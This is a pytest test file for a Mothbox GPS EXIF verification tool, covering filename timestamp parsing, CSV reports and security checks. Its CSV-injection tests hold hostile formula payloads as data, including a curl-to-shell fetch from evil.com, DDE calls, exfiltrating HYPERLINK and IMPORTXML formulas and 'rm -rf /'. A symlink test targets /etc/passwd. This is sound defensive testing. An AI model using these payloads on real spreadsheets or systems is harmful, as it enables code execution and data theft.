"""
Unit tests for scripts/verify_gps_exif.py - GPS EXIF Verification Tool

Tests the verification tool's ability to:
1. Extract timestamps from Mothbox photo filenames
2. Print GPS information in human-readable format
3. Generate CSV reports of GPS EXIF data
4. Handle errors gracefully (missing files, corrupted EXIF)

Following TDD methodology: Write tests FIRST, then implement.

Related:
- Issue #98 Phase 3: Verification Tool (Days 1-3)
- Spec: webui/docs/dev/issues/ISSUE_98_GPS_EXIF_IMPLEMENTATION_SPEC.md
"""

import pytest
from pathlib import Path
from datetime import datetime
from io import StringIO
import sys
import tempfile


# ============================================================================
# Test: extract_timestamp_from_filename()
# ============================================================================

def test_extract_timestamp_from_standard_filename():
    """Test extracting timestamp from standard Mothbox filename format."""
    from scripts.verify_gps_exif import extract_timestamp_from_filename

    # Standard format: mothbox_YYYY_MM_DD__HH_MM_SS.jpg
    filename = "mothbox_2025_01_15__12_30_45.jpg"
    timestamp = extract_timestamp_from_filename(filename)

    assert timestamp is not None
    assert timestamp.year == 2025
    assert timestamp.month == 1
    assert timestamp.day == 15
    assert timestamp.hour == 12
    assert timestamp.minute == 30
    assert timestamp.second == 45


def test_extract_timestamp_from_path_object():
    """Test extracting timestamp from Path object."""
    from scripts.verify_gps_exif import extract_timestamp_from_filename

    photo_path = Path("/photos/mothbox_2025_01_15__12_30_45.jpg")
    timestamp = extract_timestamp_from_filename(photo_path)

    assert timestamp is not None
    assert timestamp.year == 2025


def test_extract_timestamp_with_directory_path():
    """Test extracting timestamp from full directory path."""
    from scripts.verify_gps_exif import extract_timestamp_from_filename

    filename = "/var/lib/mothbox/photos/2025/01/15/mothbox_2025_01_15__12_30_45.jpg"
    timestamp = extract_timestamp_from_filename(filename)

    assert timestamp is not None
    assert timestamp.year == 2025


def test_extract_timestamp_invalid_format():
    """Test that invalid filename format returns None."""
    from scripts.verify_gps_exif import extract_timestamp_from_filename

    # Invalid formats
    assert extract_timestamp_from_filename("photo.jpg") is None
    assert extract_timestamp_from_filename("mothbox_invalid.jpg") is None
    assert extract_timestamp_from_filename("2025_01_15.jpg") is None


def test_extract_timestamp_invalid_date_values():
    """Test that invalid date values return None."""
    from scripts.verify_gps_exif import extract_timestamp_from_filename

    # Invalid month
    assert extract_timestamp_from_filename("mothbox_2025_13_15__12_30_45.jpg") is None
    # Invalid day
    assert extract_timestamp_from_filename("mothbox_2025_01_32__12_30_45.jpg") is None
    # Invalid hour
    assert extract_timestamp_from_filename("mothbox_2025_01_15__25_30_45.jpg") is None


# ============================================================================
# Test: print_gps_info()
# ============================================================================

def test_print_gps_info_with_full_data(tmp_path, capsys):
    """Test printing GPS info for photo with complete GPS EXIF."""
    from scripts.verify_gps_exif import print_gps_info

    # Create test photo with GPS EXIF
    photo_path = tmp_path / "mothbox_2025_01_15__12_30_45.jpg"

    # Use lib to create photo with GPS
    from lib.gps_exif_lib import embed_gps_exif
    from PIL import Image

    # Create blank JPEG
    img = Image.new('RGB', (100, 100))
    img.save(photo_path, 'JPEG')

    # Embed GPS data
    gps_data = {
        'latitude': 37.7749,
        'longitude': -122.4194,
        'altitude': 100.5,
        'gpstime': 1736944245,  # 2025-01-15 12:30:45 UTC
        'satellites_used': 8,
        'hdop': 1.2,
        'has_fix': True
    }
    result = embed_gps_exif(photo_path, gps_data=gps_data)
    assert result['success']

    # Test print_gps_info
    print_gps_info(photo_path)

    captured = capsys.readouterr()
    output = captured.out

    # Verify output contains expected information
    assert "mothbox_2025_01_15__12_30_45.jpg" in output
    assert "37.7749" in output
    assert "-122.4194" in output
    assert "100.5" in output or "100.50" in output
    assert "8" in output  # satellites
    assert "1.2" in output or "1.20" in output  # HDOP


def test_print_gps_info_no_gps_data(tmp_path, capsys):
    """Test printing GPS info for photo without GPS EXIF."""
    from scripts.verify_gps_exif import print_gps_info
    from PIL import Image

    # Create photo without GPS
    photo_path = tmp_path / "mothbox_2025_01_15__12_30_45.jpg"
    img = Image.new('RGB', (100, 100))
    img.save(photo_path, 'JPEG')

    # Test print_gps_info
    print_gps_info(photo_path)

    captured = capsys.readouterr()
    output = captured.out

    # Should indicate no GPS data
    assert "mothbox_2025_01_15__12_30_45.jpg" in output
    assert "No GPS" in output or "no GPS" in output


def test_print_gps_info_missing_file(tmp_path, capsys):
    """Test printing GPS info for non-existent file."""
    from scripts.verify_gps_exif import print_gps_info

    photo_path = tmp_path / "nonexistent.jpg"

    # Should handle gracefully
    print_gps_info(photo_path)

    captured = capsys.readouterr()
    output = captured.out

    # Should indicate file not found
    assert "not found" in output.lower() or "does not exist" in output.lower()


# ============================================================================
# Test: generate_csv_report()
# ============================================================================

def test_generate_csv_report_basic(tmp_path):
    """Test generating CSV report from photos with GPS EXIF."""
    from scripts.verify_gps_exif import generate_csv_report
    from lib.gps_exif_lib import embed_gps_exif
    from PIL import Image

    # Create test photos with GPS
    photos = []
    for i in range(3):
        photo_path = tmp_path / f"mothbox_2025_01_15__12_30_{i:02d}.jpg"
        img = Image.new('RGB', (100, 100))
        img.save(photo_path, 'JPEG')

        gps_data = {
            'latitude': 37.7749 + i * 0.001,
            'longitude': -122.4194 - i * 0.001,
            'altitude': 100.0 + i * 10,
            'gpstime': 1736944245 + i,
            'satellites_used': 8 + i,
            'hdop': 1.2,
            'has_fix': True
        }
        embed_gps_exif(photo_path, gps_data=gps_data)
        photos.append(photo_path)

    # Generate CSV report
    csv_output = tmp_path / "gps_report.csv"
    generate_csv_report(photos, csv_output)

    # Verify CSV was created
    assert csv_output.exists()

    # Read and verify CSV content
    with open(csv_output, 'r') as f:
        lines = f.readlines()

    # Should have header + 3 data rows
    assert len(lines) == 4

    # Check header
    header = lines[0].strip()
    assert "filename" in header.lower()
    assert "latitude" in header.lower()
    assert "longitude" in header.lower()
    assert "altitude" in header.lower()

    # Check data rows contain expected values
    for i, line in enumerate(lines[1:], start=0):
        assert f"mothbox_2025_01_15__12_30_{i:02d}.jpg" in line
        assert "37.77" in line  # Latitude
        assert "-122.4" in line  # Longitude (partial match)


def test_generate_csv_report_mixed_photos(tmp_path):
    """Test CSV report with mix of photos (with GPS, without GPS, missing)."""
    from scripts.verify_gps_exif import generate_csv_report
    from lib.gps_exif_lib import embed_gps_exif
    from PIL import Image

    photos = []

    # Photo 1: Has GPS
    photo1 = tmp_path / "mothbox_2025_01_15__12_30_00.jpg"
    img = Image.new('RGB', (100, 100))
    img.save(photo1, 'JPEG')
    gps_data = {
        'latitude': 37.7749,
        'longitude': -122.4194,
        'has_fix': True
    }
    embed_gps_exif(photo1, gps_data=gps_data)
    photos.append(photo1)

    # Photo 2: No GPS
    photo2 = tmp_path / "mothbox_2025_01_15__12_30_01.jpg"
    img = Image.new('RGB', (100, 100))
    img.save(photo2, 'JPEG')
    photos.append(photo2)

    # Photo 3: Missing file
    photo3 = tmp_path / "mothbox_2025_01_15__12_30_02.jpg"
    photos.append(photo3)

    # Generate CSV
    csv_output = tmp_path / "gps_report.csv"
    generate_csv_report(photos, csv_output)

    # Verify CSV
    assert csv_output.exists()

    with open(csv_output, 'r') as f:
        lines = f.readlines()

    # Should have header + 3 rows
    assert len(lines) == 4

    # Photo 1 should have GPS data
    assert "37.7749" in lines[1] or "37.77" in lines[1]

    # Photo 2 should indicate no GPS
    assert "No GPS" in lines[2] or "N/A" in lines[2] or lines[2].count(",") >= 2

    # Photo 3 should indicate missing/error
    assert "not found" in lines[3].lower() or "missing" in lines[3].lower() or "error" in lines[3].lower()


def test_generate_csv_report_empty_list(tmp_path):
    """Test CSV report with empty photo list."""
    from scripts.verify_gps_exif import generate_csv_report

    csv_output = tmp_path / "gps_report.csv"
    generate_csv_report([], csv_output)

    # Should create CSV with just header
    assert csv_output.exists()

    with open(csv_output, 'r') as f:
        lines = f.readlines()

    assert len(lines) == 1  # Just header


def test_generate_csv_report_includes_timestamp_from_filename(tmp_path):
    """Test that CSV report includes timestamp extracted from filename."""
    from scripts.verify_gps_exif import generate_csv_report
    from PIL import Image

    # Create photo
    photo = tmp_path / "mothbox_2025_01_15__12_30_45.jpg"
    img = Image.new('RGB', (100, 100))
    img.save(photo, 'JPEG')

    # Generate CSV
    csv_output = tmp_path / "gps_report.csv"
    generate_csv_report([photo], csv_output)

    with open(csv_output, 'r') as f:
        content = f.read()

    # Should include timestamp from filename
    assert "2025" in content
    assert "01" in content
    assert "15" in content


# ============================================================================
# Test: main() function with CLI arguments
# ============================================================================

def test_main_single_photo(tmp_path, capsys, monkeypatch):
    """Test main() with single photo argument."""
    from scripts.verify_gps_exif import main
    from lib.gps_exif_lib import embed_gps_exif
    from PIL import Image

    # Create photo with GPS
    photo = tmp_path / "mothbox_2025_01_15__12_30_45.jpg"
    img = Image.new('RGB', (100, 100))
    img.save(photo, 'JPEG')

    gps_data = {
        'latitude': 37.7749,
        'longitude': -122.4194,
        'has_fix': True
    }
    embed_gps_exif(photo, gps_data=gps_data)

    # Mock sys.argv
    monkeypatch.setattr(sys, 'argv', ['verify_gps_exif.py', str(photo)])

    # Run main
    exit_code = main()

    # Should succeed
    assert exit_code == 0

    # Should print GPS info
    captured = capsys.readouterr()
    assert "37.7749" in captured.out


def test_main_directory_scan(tmp_path, monkeypatch):
    """Test main() scanning directory for photos."""
    from scripts.verify_gps_exif import main
    from lib.gps_exif_lib import embed_gps_exif
    from PIL import Image

    # Create multiple photos
    for i in range(3):
        photo = tmp_path / f"mothbox_2025_01_15__12_30_{i:02d}.jpg"
        img = Image.new('RGB', (100, 100))
        img.save(photo, 'JPEG')

        gps_data = {
            'latitude': 37.7749,
            'longitude': -122.4194,
            'has_fix': True
        }
        embed_gps_exif(photo, gps_data=gps_data)

    # Mock sys.argv to scan directory
    monkeypatch.setattr(sys, 'argv', ['verify_gps_exif.py', str(tmp_path)])

    # Run main
    exit_code = main()

    # Should succeed
    assert exit_code == 0


def test_main_csv_output(tmp_path, monkeypatch):
    """Test main() with --csv flag."""
    from scripts.verify_gps_exif import main
    from PIL import Image

    # Create photo
    photo = tmp_path / "mothbox_2025_01_15__12_30_45.jpg"
    img = Image.new('RGB', (100, 100))
    img.save(photo, 'JPEG')

    csv_output = tmp_path / "report.csv"

    # Mock sys.argv with --csv flag
    monkeypatch.setattr(sys, 'argv', [
        'verify_gps_exif.py',
        str(photo),
        '--csv', str(csv_output)
    ])

    # Run main
    exit_code = main()

    assert exit_code == 0
    assert csv_output.exists()


def test_main_no_arguments_shows_help(capsys, monkeypatch):
    """Test main() without arguments shows help message."""
    from scripts.verify_gps_exif import main

    # Mock sys.argv with no arguments
    monkeypatch.setattr(sys, 'argv', ['verify_gps_exif.py'])

    # Run main - argparse will raise SystemExit
    with pytest.raises(SystemExit) as exc_info:
        main()

    # Should fail with non-zero exit code
    assert exc_info.value.code != 0

    # Should print usage/help
    captured = capsys.readouterr()
    output = captured.out + captured.err
    assert "usage" in output.lower() or "required" in output.lower()


def test_main_help_flag(capsys, monkeypatch):
    """Test main() with --help flag."""
    from scripts.verify_gps_exif import main

    # Mock sys.argv with --help
    monkeypatch.setattr(sys, 'argv', ['verify_gps_exif.py', '--help'])

    # Run main (should exit with 0 for help)
    with pytest.raises(SystemExit) as exc_info:
        main()

    assert exc_info.value.code == 0

    # Should print help
    captured = capsys.readouterr()
    output = captured.out
    assert "usage" in output.lower() or "verify" in output.lower()


def test_main_missing_file_error(tmp_path, capsys, monkeypatch):
    """Test main() with non-existent file."""
    from scripts.verify_gps_exif import main

    nonexistent = tmp_path / "nonexistent.jpg"

    # Mock sys.argv
    monkeypatch.setattr(sys, 'argv', ['verify_gps_exif.py', str(nonexistent)])

    # Run main
    exit_code = main()

    # Should handle gracefully (might succeed but show "not found" message)
    # or fail with non-zero exit code
    captured = capsys.readouterr()
    output = captured.out + captured.err

    # Should mention the file or indicate error
    assert str(nonexistent.name) in output or "not found" in output.lower()


# ============================================================================
# Test: Edge Cases and Error Handling
# ============================================================================

def test_extract_timestamp_with_focus_bracket_suffix():
    """Test extracting timestamp from focus bracket filename."""
    from scripts.verify_gps_exif import extract_timestamp_from_filename

    # Focus bracket format: mothbox_YYYY_MM_DD__HH_MM_SS_bracket_0.jpg
    filename = "mothbox_2025_01_15__12_30_45_bracket_0.jpg"
    timestamp = extract_timestamp_from_filename(filename)

    # Should still extract timestamp correctly
    assert timestamp is not None
    assert timestamp.year == 2025
    assert timestamp.month == 1
    assert timestamp.day == 15


def test_csv_report_handles_unicode_paths(tmp_path):
    """Test CSV report with unicode characters in paths."""
    from scripts.verify_gps_exif import generate_csv_report
    from PIL import Image

    # Create subdirectory with unicode
    unicode_dir = tmp_path / "photos_测试"
    unicode_dir.mkdir()

    photo = unicode_dir / "mothbox_2025_01_15__12_30_45.jpg"
    img = Image.new('RGB', (100, 100))
    img.save(photo, 'JPEG')

    csv_output = tmp_path / "report.csv"

    # Should handle unicode paths
    generate_csv_report([photo], csv_output)

    assert csv_output.exists()


def test_print_gps_info_with_partial_data(tmp_path, capsys):
    """Test printing GPS info when photo has minimal GPS data."""
    from scripts.verify_gps_exif import print_gps_info
    from lib.gps_exif_lib import embed_gps_exif
    from PIL import Image

    # Create photo with minimal GPS (no altitude, no satellites)
    photo = tmp_path / "mothbox_2025_01_15__12_30_45.jpg"
    img = Image.new('RGB', (100, 100))
    img.save(photo, 'JPEG')

    gps_data = {
        'latitude': 37.7749,
        'longitude': -122.4194,
        'has_fix': True
    }
    embed_gps_exif(photo, gps_data=gps_data)

    # Should handle gracefully
    print_gps_info(photo)

    captured = capsys.readouterr()
    output = captured.out

    # Should show coordinates
    assert "37.7749" in output
    assert "-122.4194" in output


# ============================================================================
# Test: Robust Filename Parsing (Regex-based)
# ============================================================================

def test_extract_timestamp_case_insensitive_extension():
    """Test extracting timestamp with uppercase/mixed-case extensions."""
    from scripts.verify_gps_exif import extract_timestamp_from_filename

    # Test various case combinations
    filenames = [
        "mothbox_2025_01_15__12_30_45.jpg",    # lowercase
        "mothbox_2025_01_15__12_30_45.JPG",    # uppercase
        "mothbox_2025_01_15__12_30_45.JpG",    # mixed case
        "mothbox_2025_01_15__12_30_45.jpeg",   # .jpeg extension
        "mothbox_2025_01_15__12_30_45.JPEG",   # uppercase .jpeg
    ]

    for filename in filenames:
        timestamp = extract_timestamp_from_filename(filename)
        assert timestamp is not None, f"Failed to parse: {filename}"
        assert timestamp.year == 2025
        assert timestamp.month == 1
        assert timestamp.day == 15
        assert timestamp.hour == 12
        assert timestamp.minute == 30
        assert timestamp.second == 45


def test_extract_timestamp_with_multiple_bracket_numbers():
    """Test extracting timestamp from focus bracket with various bracket numbers."""
    from scripts.verify_gps_exif import extract_timestamp_from_filename

    # Test bracket numbers 0-99
    for bracket_num in [0, 1, 5, 10, 25, 99]:
        filename = f"mothbox_2025_01_15__12_30_45_bracket_{bracket_num}.jpg"
        timestamp = extract_timestamp_from_filename(filename)
        assert timestamp is not None, f"Failed to parse bracket_{bracket_num}"
        assert timestamp.year == 2025
        assert timestamp.second == 45


def test_extract_timestamp_rejects_malformed_filenames():
    """Test that regex rejects filenames that don't match expected format."""
    from scripts.verify_gps_exif import extract_timestamp_from_filename

    malformed_filenames = [
        # Missing components
        "mothbox_2025_01_15.jpg",                           # Missing time
        "mothbox_2025_01__12_30_45.jpg",                    # Missing day
        "mothbox_2025__12_30_45.jpg",                       # Missing month and day
        # Wrong separators
        "mothbox-2025-01-15--12-30-45.jpg",                 # Dashes instead of underscores
        "mothbox_2025-01-15__12-30-45.jpg",                 # Mixed separators
        "mothbox_2025_01_15_12_30_45.jpg",                  # Single underscore instead of double
        # Extra underscores in wrong places
        "mothbox__2025_01_15__12_30_45.jpg",                # Double underscore at start
        "mothbox_2025_01_15___12_30_45.jpg",                # Triple underscore
        # Wrong prefix
        "photo_2025_01_15__12_30_45.jpg",                   # Wrong prefix
        "MOTHBOX_2025_01_15__12_30_45.jpg",                 # Uppercase prefix (must be lowercase)
        # Extra suffixes that don't match pattern
        "mothbox_2025_01_15__12_30_45_extra.jpg",           # Extra suffix (not _bracket_N)
        "mothbox_2025_01_15__12_30_45_bracket.jpg",         # bracket without number
        "mothbox_2025_01_15__12_30_45_bracket_X.jpg",       # bracket with non-numeric
        # Wrong file extensions
        "mothbox_2025_01_15__12_30_45.png",                 # Wrong extension
        "mothbox_2025_01_15__12_30_45.txt",                 # Wrong extension
        "mothbox_2025_01_15__12_30_45",                     # No extension
        # Completely wrong formats
        "random_filename.jpg",
        "2025_01_15.jpg",
        "",
    ]

    for filename in malformed_filenames:
        timestamp = extract_timestamp_from_filename(filename)
        assert timestamp is None, f"Should reject malformed filename: {filename}"


def test_extract_timestamp_validates_date_ranges():
    """Test that regex extracts values but datetime validation catches invalid ranges."""
    from scripts.verify_gps_exif import extract_timestamp_from_filename

    invalid_dates = [
        # Invalid months
        "mothbox_2025_00_15__12_30_45.jpg",   # Month 0
        "mothbox_2025_13_15__12_30_45.jpg",   # Month 13
        # Invalid days
        "mothbox_2025_01_00__12_30_45.jpg",   # Day 0
        "mothbox_2025_01_32__12_30_45.jpg",   # Day 32
        "mothbox_2025_02_30__12_30_45.jpg",   # Feb 30 (doesn't exist)
        # Invalid hours
        "mothbox_2025_01_15__24_30_45.jpg",   # Hour 24
        "mothbox_2025_01_15__99_30_45.jpg",   # Hour 99
        # Invalid minutes
        "mothbox_2025_01_15__12_60_45.jpg",   # Minute 60
        "mothbox_2025_01_15__12_99_45.jpg",   # Minute 99
        # Invalid seconds
        "mothbox_2025_01_15__12_30_60.jpg",   # Second 60
        "mothbox_2025_01_15__12_30_99.jpg",   # Second 99
    ]

    for filename in invalid_dates:
        timestamp = extract_timestamp_from_filename(filename)
        assert timestamp is None, f"Should reject invalid date/time: {filename}"


def test_extract_timestamp_with_full_path():
    """Test extracting timestamp from various full path formats."""
    from scripts.verify_gps_exif import extract_timestamp_from_filename

    full_paths = [
        "/var/lib/mothbox/photos/mothbox_2025_01_15__12_30_45.jpg",
        "/home/pi/Desktop/Mothbox/photos/mothbox_2025_01_15__12_30_45.jpg",
        "/tmp/test/mothbox_2025_01_15__12_30_45_bracket_3.jpg",
        "../photos/mothbox_2025_01_15__12_30_45.jpg",  # Relative path
        "./mothbox_2025_01_15__12_30_45.jpg",  # Current directory
    ]

    for path in full_paths:
        timestamp = extract_timestamp_from_filename(path)
        assert timestamp is not None, f"Failed to parse path: {path}"
        assert timestamp.year == 2025
        assert timestamp.month == 1
        assert timestamp.day == 15


def test_extract_timestamp_edge_case_dates():
    """Test extracting timestamps for edge case valid dates."""
    from scripts.verify_gps_exif import extract_timestamp_from_filename

    edge_cases = [
        # Leap year
        ("mothbox_2024_02_29__12_30_45.jpg", 2024, 2, 29),
        # End of year
        ("mothbox_2025_12_31__23_59_59.jpg", 2025, 12, 31),
        # Start of year
        ("mothbox_2025_01_01__00_00_00.jpg", 2025, 1, 1),
        # Noon
        ("mothbox_2025_06_15__12_00_00.jpg", 2025, 6, 15),
        # Midnight
        ("mothbox_2025_06_15__00_00_00.jpg", 2025, 6, 15),
    ]

    for filename, expected_year, expected_month, expected_day in edge_cases:
        timestamp = extract_timestamp_from_filename(filename)
        assert timestamp is not None, f"Failed to parse: {filename}"
        assert timestamp.year == expected_year
        assert timestamp.month == expected_month
        assert timestamp.day == expected_day


def test_extract_timestamp_rejects_non_leap_year_feb_29():
    """Test that Feb 29 is rejected for non-leap years."""
    from scripts.verify_gps_exif import extract_timestamp_from_filename

    # 2025 is not a leap year, so Feb 29 should be rejected
    filename = "mothbox_2025_02_29__12_30_45.jpg"
    timestamp = extract_timestamp_from_filename(filename)
    assert timestamp is None, "Should reject Feb 29 in non-leap year"


def test_extract_timestamp_with_path_object():
    """Test that Path objects are handled correctly."""
    from scripts.verify_gps_exif import extract_timestamp_from_filename
    from pathlib import Path

    # Test with Path object
    path_obj = Path("/photos/mothbox_2025_01_15__12_30_45.jpg")
    timestamp = extract_timestamp_from_filename(path_obj)

    assert timestamp is not None
    assert timestamp.year == 2025
    assert timestamp.month == 1
    assert timestamp.day == 15


def test_extract_timestamp_year_range():
    """Test extracting timestamps with various year values."""
    from scripts.verify_gps_exif import extract_timestamp_from_filename

    # Test different year values (4 digits required by regex)
    years = [2020, 2025, 2030, 2099, 1999, 1900]

    for year in years:
        filename = f"mothbox_{year}_01_15__12_30_45.jpg"
        timestamp = extract_timestamp_from_filename(filename)
        assert timestamp is not None, f"Failed to parse year: {year}"
        assert timestamp.year == year


# ============================================================================
# Test: sanitize_csv_value() - CSV Injection Prevention
# ============================================================================

def test_sanitize_csv_value_formula_prefix():
    """Test that CSV formula prefixes are escaped."""
    from scripts.verify_gps_exif import sanitize_csv_value

    # Test all dangerous prefixes that spreadsheet apps interpret as formulas
    # Note: Numeric values like "+123" or "-123" are NOT escaped (they're safe numbers)
    dangerous_values = [
        "=SUM(A1:A10)",          # Formula
        "+command",              # Plus prefix with non-numeric text
        "-command",              # Minus prefix with non-numeric text
        "@SUM(A1:A10)",          # @ prefix (older Excel formula syntax)
        "\t=malicious",          # Tab followed by formula
        "+123abc",               # Starts with + but not a valid number
        "-123abc",               # Starts with - but not a valid number
    ]

    for value in dangerous_values:
        sanitized = sanitize_csv_value(value)
        assert sanitized.startswith("'"), f"Should prefix '{value}' with single quote"
        assert sanitized == "'" + value, f"Should be exactly \"'{value}\""


def test_sanitize_csv_value_normal_text():
    """Test that normal text is not modified."""
    from scripts.verify_gps_exif import sanitize_csv_value

    # Normal values that should NOT be escaped
    normal_values = [
        "mothbox_2025_01_15__12_30_45.jpg",
        "OK",
        "No GPS",
        "Missing File",
        "37.7749",
        "-122.4194",
        "2025-01-15 12:30:00",
        "normal text with spaces",
        "text-with-dashes",
        "text_with_underscores",
    ]

    for value in normal_values:
        sanitized = sanitize_csv_value(value)
        assert sanitized == value, f"Should not modify normal value: {value}"


def test_sanitize_csv_value_empty_string():
    """Test that empty strings are handled correctly."""
    from scripts.verify_gps_exif import sanitize_csv_value

    assert sanitize_csv_value("") == ""
    assert sanitize_csv_value(None) is None


def test_sanitize_csv_value_numeric():
    """Test that numeric values are handled correctly."""
    from scripts.verify_gps_exif import sanitize_csv_value

    # Numeric values (converted to strings) should NOT be escaped
    assert sanitize_csv_value("123") == "123"
    assert sanitize_csv_value("0") == "0"
    assert sanitize_csv_value("3.14159") == "3.14159"

    # Negative numbers should NOT be escaped (they're safe)
    assert sanitize_csv_value("-122.4194") == "-122.4194"
    assert sanitize_csv_value("-430.5") == "-430.5"
    assert sanitize_csv_value("-1") == "-1"

    # Positive numbers with + prefix should NOT be escaped (they're safe)
    assert sanitize_csv_value("+1.5") == "+1.5"
    assert sanitize_csv_value("+100") == "+100"
    assert sanitize_csv_value("+0.001") == "+0.001"

    # Scientific notation should NOT be escaped
    assert sanitize_csv_value("1.5e-10") == "1.5e-10"
    assert sanitize_csv_value("-3.2e+5") == "-3.2e+5"


def test_sanitize_csv_value_injection_in_error_message():
    """
    Test sanitization of error messages that could contain injection.

    Note: Only values that START with dangerous characters are escaped.
    If the dangerous character is in the middle, it's safe because
    spreadsheet apps only interpret formulas at the start of a cell.
    """
    from scripts.verify_gps_exif import sanitize_csv_value

    # These messages start with safe text, so they won't be escaped
    # (dangerous characters are in the middle, which is safe)
    safe_error_messages = [
        "Error: =SYSTEM('rm -rf /')",
        "Error: +malicious_command",
        "Error: File @evil.jpg not found",
    ]

    for error in safe_error_messages:
        sanitized = sanitize_csv_value(error)
        # Should NOT be escaped (starts with "Error:", not with dangerous char)
        assert sanitized == error, f"Should not escape: {error}"

    # These messages START with dangerous characters, so they WILL be escaped
    dangerous_error_messages = [
        "=SYSTEM('rm -rf /')",
        "+malicious_command",
        "@evil.jpg not found",
        "\t=DDE()",
    ]

    for error in dangerous_error_messages:
        sanitized = sanitize_csv_value(error)
        # Should be escaped (starts with dangerous character)
        assert sanitized.startswith("'"), f"Should escape error: {error}"
        assert sanitized == "'" + error, f"Should be exactly \"'{error}\""


def test_sanitize_csv_value_in_csv_generation(tmp_path):
    """
    Test that CSV generation applies sanitization to all fields.

    This is an integration test that verifies sanitize_csv_value() is
    actually used when generating CSV reports.
    """
    from scripts.verify_gps_exif import generate_csv_report
    from pathlib import Path
    import csv

    # Create a fake photo with malicious filename
    malicious_filename = "=malicious.jpg"
    fake_photo = tmp_path / malicious_filename
    fake_photo.write_text("not a real jpeg")

    # Generate CSV report
    output_csv = tmp_path / "test_report.csv"
    generate_csv_report([fake_photo], output_csv)

    # Read CSV and verify sanitization
    with open(output_csv, 'r', encoding='utf-8') as f:
        reader = csv.DictReader(f)
        rows = list(reader)

    assert len(rows) == 1
    row = rows[0]

    # Filename should be sanitized (prefixed with ')
    assert row['filename'] == f"'{malicious_filename}", "Filename should be sanitized"

    # Status should contain error message (file doesn't exist or isn't valid JPEG)
    # Error message should also be sanitized if it contains dangerous prefixes
    assert row['status'] != "", "Status should contain an error"


def test_csv_injection_real_world_scenarios(tmp_path):
    """
    Test CSV injection prevention with real-world attack scenarios.

    Scenarios tested:
    1. DDE (Dynamic Data Exchange) attack
    2. Remote code execution attempt
    3. System command injection
    4. Hyperlink injection
    """
    from scripts.verify_gps_exif import sanitize_csv_value

    real_world_attacks = [
        # DDE attack (older Excel vulnerability)
        '=cmd|"/c calc"!A1',

        # Remote code execution
        '=SYSTEM("curl evil.com/malware.sh | sh")',

        # Hyperlink injection
        '=HYPERLINK("http://evil.com?data=" & A1, "Click me")',

        # Command injection via formula
        '+IMPORTXML(CONCAT("http://evil.com?data=", A1), "//a")',

        # Tab-prefixed DDE
        '\t@SUM(A1:A10)|calc.exe!A1',
    ]

    for attack in real_world_attacks:
        sanitized = sanitize_csv_value(attack)

        # All attacks should be escaped with leading quote
        assert sanitized.startswith("'"), f"Attack not sanitized: {attack}"

        # Verify the original dangerous content is preserved but escaped
        assert sanitized == "'" + attack, f"Sanitization modified content: {attack}"


# ============================================================================
# Test: Symlink Security Filtering
# ============================================================================

def test_verify_tool_rejects_symlinks(tmp_path):
    """
    Test that verify_gps_exif.py filters out symlinks for security.

    Security rationale:
    - Symlinks can point outside intended directory (directory traversal)
    - Symlinks can point to sensitive files (/etc/passwd, /etc/shadow)
    - Only process regular files within specified directory
    """
    from scripts.verify_gps_exif import main
    import subprocess
    import sys

    # Create real photo
    real_photo = tmp_path / "real_photo.jpg"
    real_photo.write_bytes(b"fake jpeg data")

    # Create symlink to photo (benign but still filtered)
    symlink_photo = tmp_path / "symlink_photo.jpg"
    symlink_photo.symlink_to(real_photo)

    # Create symlink to sensitive file (directory traversal attempt)
    evil_symlink = tmp_path / "evil.jpg"
    evil_symlink.symlink_to("/etc/passwd")

    # Test directory scanning - should filter symlinks
    # Use PROJECT_ROOT (set by conftest.py) for cwd to work in CI
    import os
    project_root = os.environ.get('PROJECT_ROOT', Path(__file__).parent.parent.parent)
    result = subprocess.run(
        [sys.executable, "-m", "scripts.verify_gps_exif", str(tmp_path)],
        capture_output=True,
        text=True,
        cwd=str(project_root)
    )

    # Should only process real_photo.jpg, not symlinks
    assert "real_photo.jpg" in result.stdout or "1 photos" in result.stdout
    assert "/etc/passwd" not in result.stdout, "Should not access evil symlink"
    assert "evil.jpg" not in result.stdout, "Should not process evil symlink"

    # Verify only 1 photo found (real_photo), not 3 (including symlinks)
    assert "1 photos" in result.stdout or "1 photo" in result.stdout.lower()

def test_verify_tool_rejects_single_symlink(tmp_path):
    """Test that single file symlink is rejected with warning."""
    import subprocess
    import sys

    # Create real photo
    real_photo = tmp_path / "real.jpg"
    real_photo.write_bytes(b"fake jpeg")

    # Create symlink
    symlink_photo = tmp_path / "link.jpg"
    symlink_photo.symlink_to(real_photo)

    # Try to verify symlink directly
    # Use PROJECT_ROOT (set by conftest.py) for cwd to work in CI
    import os
    project_root = os.environ.get('PROJECT_ROOT', Path(__file__).parent.parent.parent)
    result = subprocess.run(
        [sys.executable, "-m", "scripts.verify_gps_exif", str(symlink_photo)],
        capture_output=True,
        text=True,
        cwd=str(project_root)
    )

    # Should reject with warning
    assert "Skipping symlink" in result.stderr or "No photos found" in result.stderr

    # Should not process the file
    assert result.returncode != 0 or "No photos found" in result.stderr
